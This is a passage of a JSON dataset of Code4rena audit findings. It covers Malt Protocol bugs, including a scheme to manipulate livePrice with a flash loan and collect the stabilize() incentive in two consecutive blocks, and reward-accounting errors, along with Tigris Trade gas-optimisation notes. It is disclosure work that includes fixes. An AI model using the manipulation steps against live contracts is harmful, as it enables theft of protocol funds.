      "content": "\nIn StabilizerNode, the default behaviour when twap is below the lower peg threshold, all transfers to the amm pool are blocked. However when `usePrimedWindow = true`, it will only block transfers for `primedWindow = 10` blocks. After 10 blocks, the block automatically stops and allows free market trading.\n\nThe first call to start this priming will receive `defaultIncentive` Malt and set `primedBlock` to start the priming. However, function `_validateSwingTraderTrigger()` which is used to validate and start the priming using `livePrice` is easy to be manipulated. Attacker can manipulate it to receive `defaultIncentive` in 2 consecutive blocks.\n\n### Proof of Concept\n\nConsider the scenario:\n\n1.  Block i, twap is below the value returned from `maltDataLab.getSwingTraderEntryPrice()`, attacker call `stabilize()` and receive `defaultIncentive`. `primedBlock = block.number`.\n2.  Block i+1, call to `_validateSwingTraderTrigger()` return `true` and trigger swing trader to bring the price back to peg. It's also reset `primedBlock = 0` (stop blocking transfer to AMM pool)\n3.  Since only 1 block pass, let's assume twap is still below the value returned from `maltDataLab.getSwingTraderEntryPrice()` (because twap moves slowly and will not change immediately to current price)\n4.  Now attacker can use flash loan to manipulate the `livePrice` to be larger than `entryPrice` (tranfer to AMM is not blocked) and call `stabilize()` to receive incentive again then repay the flash loan.\n\nAttacker cost is only flash loan fee, since his call will start an auction but not trigger swing trader so the state of AMM pool when he repays the flash loan is still the same (only added flash loan fee).\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L312-L334>\n\n```solidity\nfunction _validateSwingTraderTrigger(uint256 livePrice, uint256 entryPrice)\n    internal\n    returns (bool)\n  {\n    if (usePrimedWindow) {\n      if (livePrice > entryPrice) {\n        return false;\n      }\n\n      if (block.number > primedBlock + primedWindow) {\n        primedBlock = block.number;\n        malt.mint(msg.sender, defaultIncentive * (10**malt.decimals()));\n        emit MintMalt(defaultIncentive * (10**malt.decimals()));\n        return false;\n      }\n\n      if (primedBlock == block.number) {\n        return false;\n      }\n    }\n\n    return true;\n  }\n```\n\n### Recommended Mitigation Steps\n\nConsider not giving incentives for caller or reset the `primedBlock` at least after `primedWindow` blocks.\n\n**[0xScotch (Malt) commented](https://github.com/code-423n4/2023-02-malt-findings/issues/14#issuecomment-1447044279):**\n > I’m kinda skeptical of this but I think its possible in theory.\n> \n> However:\n> - `stabilize` can only be called via EOA due to `msg.sender == tx.origin` check (in `onlyEOA` modifier)\n> - Size of flashloan required is proportional to the size of the pool (as you have to manipulate price of that pool) while the incentive is fixed. So it seems like this would quickly become unprofitable\n> \n> I would be very curious to see a real PoC of this rather than just a theoretical threat.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-02-malt-findings/issues/14#issuecomment-1455212754):**\n > Regarding the previous comment:\n>  - The `onlyEOA` check can be bypassed using a sandwich attack instead of a flashloan so the possibility of a MEV attack still exists\n>  - We should consider that the cost of capital within a block is 0. For example, Euler already proposes feeless flashloans of up to their TVL. See https://twitter.com/euler_mab/status/1595725665868910595. However there would still be the cost of using the AMM to manipulate the price.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-02-malt-findings/issues/14#issuecomment-1455215172):**\n > Although the possibility of this being implemented depends on the size of the incentives and the cost of manipulating the AMM, it does not seem so unlikely. It could lead to a significant loss for the protocol, so I agree that high severity is appropriate.\n\n**[0xScotch (Malt) acknowledged](https://github.com/code-423n4/2023-02-malt-findings/issues/14)**\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the StabilizerNode contract, which is part of the 2023-02-malt project on GitHub. The code for this contract can be found at the specified link. The vulnerability allows an attacker to manipulate the \"livePrice\" value, which is used to validate and start the priming process, in order to receive a \"defaultIncentive\" of Malt in two consecutive blocks. The attacker can do this by using a flash loan to manipulate the \"livePrice\" value and then calling the `stabilize()` function to receive the incentive. The only cost to the attacker is the flash loan fee, as the state of the AMM pool remains unchanged. The recommended mitigation steps for this vulnerability are to either not give incentives to the caller or to reset the \"primedBlock\" value after the \"primedWindow\" has passed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/14",
      "tags": [],
      "finders": [
        "minhquanym"
      ]
    },
    {
      "id": "16074",
      "title": "[H-02] RewardThrottle: If an epoch does not have any profit, then there may not be rewards for that epoch at the start of the next epoch.",
      "impact": "HIGH",
      "content": "\nIn RewardThrottle, both checkRewardUnderflow and fillInEpochGaps call `\\_fillInEpochGaps` to fill the state of the previous epoch without profit, the difference being that checkRewardUnderflow will request the reward from the overflowPool and distribute the reward, whereas fillInEpochGaps does not.\n\n```solidity\n  function checkRewardUnderflow() public onlyActive {\n    uint256 epoch = timekeeper.epoch();\n\n    uint256 _activeEpoch = activeEpoch; // gas\n\n    // Fill in gaps so we have a fresh foundation to calculate from\n    _fillInEpochGaps(epoch);\n\n    if (epoch > _activeEpoch) {\n      for (uint256 i = _activeEpoch; i < epoch; ++i) {\n        uint256 underflow = _getRewardUnderflow(i);\n\n        if (underflow > 0) {\n          uint256 balance = overflowPool.requestCapital(underflow);\n\n          _sendToDistributor(balance, i);\n        }\n      }\n    }\n  }\n\n  function fillInEpochGaps() external {\n    uint256 epoch = timekeeper.epoch();\n\n    _fillInEpochGaps(epoch);\n  }\n```\n\nThis results in that when an epoch does not have any profit, then at the start of the next epoch that epoch will have a reward if checkRewardUnderflow is called, and no reward if `fillInEpochGaps` is called.\n\nAccording to the documentation, when an epoch is not profitable enough, the reward should be requested from the overflowPool, so checkRewardUnderflow should be called. And if `fillInEpochGaps` is called first, the epoch will lose its reward.\n\nNote: populateFromPreviousThrottle will also cause epochs without any profit to lose their rewards\n\n```solidity\n  function populateFromPreviousThrottle(address previousThrottle, uint256 epoch)\n    external\n    onlyRoleMalt(ADMIN_ROLE, \"Only admin role\")\n  {\n    RewardThrottle previous = RewardThrottle(previousThrottle);\n    uint256 _activeEpoch = activeEpoch; // gas\n\n    for (uint256 i = _activeEpoch; i < epoch; ++i) {\n      (\n        uint256 profit,\n        uint256 rewarded,\n        uint256 bondedValue,\n        uint256 desiredAPR,\n        uint256 epochsPerYear,\n        uint256 cumulativeCashflowApr,\n        uint256 cumulativeApr\n      ) = previous.epochData(i);\n\n      state[i].bondedValue = bondedValue;\n      state[i].profit = profit;\n      state[i].rewarded = rewarded;\n      state[i].epochsPerYear = epochsPerYear;\n      state[i].desiredAPR = desiredAPR;\n      state[i].cumulativeCashflowApr = cumulativeCashflowApr;\n      state[i].cumulativeApr = cumulativeApr;\n    }\n\n    activeEpoch = epoch;\n  }\n```\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L437-L462>\n\n### Recommended Mitigation Steps\n\nConsider removing the `fillInEpochGaps` function, or only allowing it to be called when the contract is not active.\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/20#issuecomment-1447038822):**\n > We will be removing both implementations of `fillInEpochGaps`.\n\n***\n\n",
      "summary": "\nThis bug report is about the RewardThrottle contract in the 2023-02-malt repository on Github. It highlights the vulnerability that when an epoch does not have any profit, then at the start of the next epoch that epoch will have a reward if checkRewardUnderflow is called, and no reward if fillInEpochGaps is called. The bug is further compounded by the populateFromPreviousThrottle function, which also causes epochs without any profit to lose their rewards.\n\nThe impact of this vulnerability is that the epochs without any profit will lose their rewards. This could result in a loss of funds for the contract.\n\nThe recommended mitigation step is to consider removing the fillInEpochGaps function, or only allowing it to be called when the contract is not active. This will ensure that the epochs without any profit will not lose their rewards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/20",
      "tags": [],
      "finders": [
        "cccz",
        "hansfriese"
      ]
    },
    {
      "id": "16073",
      "title": "[H-01] `RewardThrottle.checkRewardUnderflow()` might track the cumulative `APR`s wrongly.",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L445-L455> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L576>\n\n### Impact\n\n`RewardThrottle.checkRewardUnderflow()` might calculate the cumulative `APR`s for epochs wrongly.\n\nAs a result, `cashflowAverageApr` will be calculated incorrectly in `updateDesiredAPR()`, and `targetAPR` would be changed unexpectedly.\n\n### Proof of Concept\n\nIn `checkRewardUnderflow()`, it calls a `_sendToDistributor()` function to update cumulative `APR`s after requesting some capitals from the overflow pool.\n\n```solidity\nFile: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol\n445:     if (epoch > _activeEpoch) {\n446:       for (uint256 i = _activeEpoch; i < epoch; ++i) {\n447:         uint256 underflow = _getRewardUnderflow(i);\n448: \n449:         if (underflow > 0) {\n450:           uint256 balance = overflowPool.requestCapital(underflow);\n451: \n452:           _sendToDistributor(balance, i);  //@audit cumulative apr will be tracked wrongly when epoch > _activeEpoch + 1\n453:         }\n454:       }\n455:     }\n```\n\nThe main reason for this issue is that `_sendToDistributor()` doesn't update the cumulative `APR`s when `amount == 0` and the below scenario would be possible.\n\n1.  Let's assume `activeEpoch = 100` and `epoch = 103`. It's possible if the active epoch wasn't updated for 2 epochs.\n2.  After that, the `checkRewardUnderflow()` function will call `_fillInEpochGaps()` and the cumulative `APR`s will be settled accordingly.\n3.  And it will try to request capitals from the `overflowPool` and increase the rewards for epochs.\n4.  At epoch 100, it requests some positive `balance` from `overflowPool` and increases the cumulative `APR`s for epoch 101 correctly in `_sendToDistributor()`.\n\n```solidity\nFile: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol\n611:     state[epoch].rewarded = state[epoch].rewarded + rewarded;\n612:     state[epoch + 1].cumulativeCashflowApr = \n613:       state[epoch].cumulativeCashflowApr +\n614:       epochCashflowAPR(epoch);\n615:     state[epoch + 1].cumulativeApr = \n616:       state[epoch].cumulativeApr +\n617:       epochAPR(epoch);\n618:     state[epoch].bondedValue = bonding.averageBondedValue(epoch);\n```\n\n5.  After that, the `overflowPool` doesn't have any remaining funds and the `balance(At L450)` will be 0 for epochs 101, 102.\n6.  So `_sendToDistributor()` will be terminated right away and won't increase the cumulative `APR`s of epoch 102 according to epoch 101 and this value won't be changed anymore because the `activeEpoch` is 103 already.\n\n```solidity\nFile: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol\n575:   function _sendToDistributor(uint256 amount, uint256 epoch) internal { \n576:     if (amount == 0) {\n577:       return;\n578:     }\n```\n\nAs a result, the cumulative `APR`s will save smaller values from epoch 102 and `cashflowAverageApr` will be smaller also if the `smoothingPeriod` contains such epochs in `updateDesiredAPR()`.\n\n```solidity\nFile: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol\n139:     uint256 cashflowAverageApr = averageCashflowAPR(smoothingPeriod);\n```\n\nSo the `updateDesiredAPR()` function will change the `targetAPR` using the smaller average value and the smoothing logic wouldn't work as expected.\n\n### Recommended Mitigation Steps\n\nI think `_sendToDistributor()` should update the cumulative `APR`s as well when `amount == 0`.\n\n```solidity\n  function _sendToDistributor(uint256 amount, uint256 epoch) internal {\n    if (amount == 0) {\n        state[epoch + 1].cumulativeCashflowApr = state[epoch].cumulativeCashflowApr + epochCashflowAPR(epoch);\n        state[epoch + 1].cumulativeApr = state[epoch].cumulativeApr + epochAPR(epoch);\n        state[epoch].bondedValue = bonding.averageBondedValue(epoch);\n\n        return;\n    }\n```\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/23#issuecomment-1447018581):**\n > Interesting finding. It's valid but the bug would actually result in the protocol retaining more capital due to reporting lower APRs than it should. \n\n\n***\n\n",
      "summary": "\nThis bug report is related to the RewardThrottle.sol contract in the 2023-02-malt GitHub repository. The issue is that the cumulative APRs for epochs may be calculated incorrectly, resulting in the cashflowAverageApr being calculated incorrectly in the updateDesiredAPR() function, and then the targetAPR would be changed unexpectedly. \n\nThe problem lies in the _sendToDistributor() function, which doesn't update the cumulative APRs when the amount is 0. This can happen if the activeEpoch has not been updated for two epochs, and then the checkRewardUnderflow() function calls the _fillInEpochGaps() function to settle the cumulative APRs. When it requests some capital from the overflowPool, if the amount is 0, the _sendToDistributor() function will terminate without updating the cumulative APRs for the next epoch. This means that the cashflowAverageApr will be calculated using a lower value, resulting in the targetAPR being changed unexpectedly.\n\nThe recommended mitigation step is to update the cumulative APRs in _sendToDistributor() when the amount is 0. This can be done by adding the following code to the function:\n\n```solidity\n  function _sendToDistributor(uint256 amount, uint256 epoch) internal {\n    if (amount == 0) {\n        state[epoch + 1].cumulativeCashflowApr = state[epoch].cumulativeCashflowApr + epochCashflowAPR(epoch);\n        state[epoch + 1].cumulativeApr = state[epoch].cumulativeApr + epochAPR(epoch);\n        state[epoch].bondedValue = bonding.averageBondedValue(epoch);\n\n        return;\n    }\n```\n\nThis will ensure that the cumulative APRs are updated even when the amount is 0, and the targetAPR will be calculated correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/23",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "43223",
      "title": "[G-30]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 64 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n63:           require(allowedAsset[_asset], \"!Asset\");\n\n/// @audit (valid but excluded finding)\n106:          require(bond.owner == _sender, \"!owner\");\n\n/// @audit (valid but excluded finding)\n107:          require(!bond.expired, \"Expired\");\n\n/// @audit (valid but excluded finding)\n108:          require(bond.asset == _asset, \"!BondAsset\");\n\n/// @audit (valid but excluded finding)\n110:          require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n\n/// @audit (valid but excluded finding)\n111:          require(bond.period+_period <= 365, \"MAX PERIOD\");\n\n/// @audit (valid but excluded finding)\n142:          require(bond.expired, \"!expire\");\n\n/// @audit (valid but excluded finding)\n145:                  require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n\n/// @audit (valid but excluded finding)\n173:          require(_claimer == bond.owner, \"!owner\");\n\n/// @audit (valid but excluded finding)\n329:          require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n\n/// @audit (valid but excluded finding)\n330:          require(!bond.expired, \"Expired!\");\n\n/// @audit (valid but excluded finding)\n332:              require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n\n/// @audit (valid but excluded finding)\n350:          require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n\n/// @audit (valid but excluded finding)\n358:          require(assets[assetsIndex[_asset]] == _asset, \"Not added\");\n\n/// @audit (valid but excluded finding)\n373:          require(msg.sender == manager, \"!manager\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L63\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n51:           require(counter <= MAX, \"Exceeds supply\");\n\n/// @audit (valid but excluded finding)\n65:           require(msg.sender == address(this) || _msgSender() == owner(), \"NotBridge\");\n\n/// @audit (valid but excluded finding)\n66:           require(tokenId <= 10000, \"BadID\");\n\n/// @audit (valid but excluded finding)\n94:           require(ownerOf(tokenId) == from, \"!Owner\");\n\n/// @audit (valid but excluded finding)\n130:          require(tokenId.length > 0, \"Not bridging\");\n\n/// @audit (valid but excluded finding)\n132:              require(_msgSender() == ownerOf(tokenId[i]), \"Not the owner\");\n\n/// @audit (valid but excluded finding)\n140:          require(isTrustedAddress[_dstChainId][targetAddress], \"!Trusted\");\n\n/// @audit (valid but excluded finding)\n174:          require(_msgSender() == address(endpoint), \"!Endpoint\");\n\n/// @audit (valid but excluded finding)\n185:          require(msg.sender == address(this), \"NonblockingLzApp: caller must be app\");\n\n/// @audit (valid but excluded finding)\n194:          require(isTrustedAddress[_srcChainId][fromAddress], \"!TrustedAddress\");\n\n/// @audit (valid but excluded finding)\n209:          require(payloadHash != bytes32(0), \"NonblockingLzApp: no stored message\");\n\n/// @audit (valid but excluded finding)\n210:          require(keccak256(_payload) == payloadHash, \"NonblockingLzApp: invalid payload\");\n\n/// @audit (valid but excluded finding)\n241:          require(address(_endpoint) != address(0), \"ZeroAddress\");\n\n/// @audit (valid but excluded finding)\n301:          require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L51\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n66:           require(_period <= maxPeriod, \"MAX PERIOD\");\n\n/// @audit (valid but excluded finding)\n67:           require(_period >= minPeriod, \"MIN PERIOD\");\n\n/// @audit (valid but excluded finding)\n68:           require(allowedAssets[_asset], \"!asset\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L66\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit (valid but excluded finding)\n35:           require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n50:           require(_assetName.length == 0, \"Already exists\");\n\n/// @audit (valid but excluded finding)\n51:           require(bytes(_name).length > 0, \"No name\");\n\n/// @audit (valid but excluded finding)\n52:           require(_maxLeverage >= _minLeverage && _minLeverage > 0, \"Wrong leverage values\");\n\n/// @audit (valid but excluded finding)\n75:           require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n84:           require(_idToAsset[_asset].maxLeverage >= _idToAsset[_asset].minLeverage, \"Wrong leverage values\");\n\n/// @audit (valid but excluded finding)\n94:           require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n95:           require(_baseFundingRate <= maxBaseFundingRate, \"baseFundingRate too high\");\n\n/// @audit (valid but excluded finding)\n106:          require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n117:          require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n141:          require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n157:              require(_idToOi[_asset][_tigAsset].longOi <= _idToOi[_asset][_tigAsset].maxOi || _idToOi[_asset][_tigAsset].maxOi == 0, \"MaxLongOi\");\n\n/// @audit (valid but excluded finding)\n177:              require(_idToOi[_asset][_tigAsset].shortOi <= _idToOi[_asset][_tigAsset].maxOi || _idToOi[_asset][_tigAsset].maxOi == 0, \"MaxShortOi\");\n\n/// @audit (valid but excluded finding)\n190:          require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L35\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n315:          require(_isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L315\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit (valid but excluded finding)\n21:           require(_referral[_hash] == address(0), \"Referral code already exists\");\n\n/// @audit (valid but excluded finding)\n81:           require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L21\n\n```solidity\nFile: contracts/StableToken.sol\n\n/// @audit (valid but excluded finding)\n52:           require(isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L52\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit (valid but excluded finding)\n45:           require(allowed[_token], \"Token not listed\");\n\n/// @audit (valid but excluded finding)\n79:           require(!allowed[_token], \"Already added\");\n\n/// @audit (valid but excluded finding)\n90:           require(allowed[_token], \"Not added\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L45\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit (valid but excluded finding)\n279:          require(msg.sender == trading, \"!protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L279\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit (valid but excluded finding)\n876:          require(allowedVault[_stableVault], \"Unapproved stablevault\");\n\n/// @audit (valid but excluded finding)\n877:          require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n\n/// @audit (valid but excluded finding)\n887:              require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L876\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit (valid but excluded finding)\n105:          require(_provider == _priceData.provider, \"BadSig\");\n\n/// @audit (valid but excluded finding)\n106:          require(_isNode[_provider], \"!Node\");\n\n/// @audit (valid but excluded finding)\n107:          require(_asset == _priceData.asset, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n108:          require(!_priceData.isClosed, \"Closed\");\n\n/// @audit (valid but excluded finding)\n109:          require(block.timestamp >= _priceData.timestamp, \"FutSig\");\n\n/// @audit (valid but excluded finding)\n110:          require(block.timestamp <= _priceData.timestamp + _validSignatureTimer, \"ExpSig\");\n\n/// @audit (valid but excluded finding)\n111:          require(_priceData.price > 0, \"NoPrice\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L105\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43222",
      "title": "[G-29]  Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n12:       uint public constant minPeriod = 7;\n\n/// @audit (valid but excluded finding)\n13:       uint public constant maxPeriod = 365;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L12\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n16:       uint constant public DIVISION_CONSTANT = 1e10; // 100%\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L16\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43221",
      "title": "[G-28]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "Saves **5 gas per loop**\n\n*There are 21 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n220:                  for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n\n/// @audit (valid but excluded finding)\n284:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n292:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n300:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n342:              for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L220\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n53:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n67:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n78:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n95:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n105:          for (uint i=0; i<_amount; i++) {\n\n/// @audit (valid but excluded finding)\n131:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n200:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n246:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n252:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n258:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n325:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L53\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n113:          for (uint i=0; i < assets.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n296:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n304:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit (valid but excluded finding)\n70:           for (uint i=0; i<_codeOwnersL; i++) {\n\n/// @audit (valid but excluded finding)\n73:           for (uint i=0; i<_referredAL; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L70\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43220",
      "title": "[G-27]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n130:          require(tokenId.length > 0, \"Not bridging\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L130\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43219",
      "title": "[G-26]  Using `bool`s for storage incurs overhead",
      "impact": "GAS",
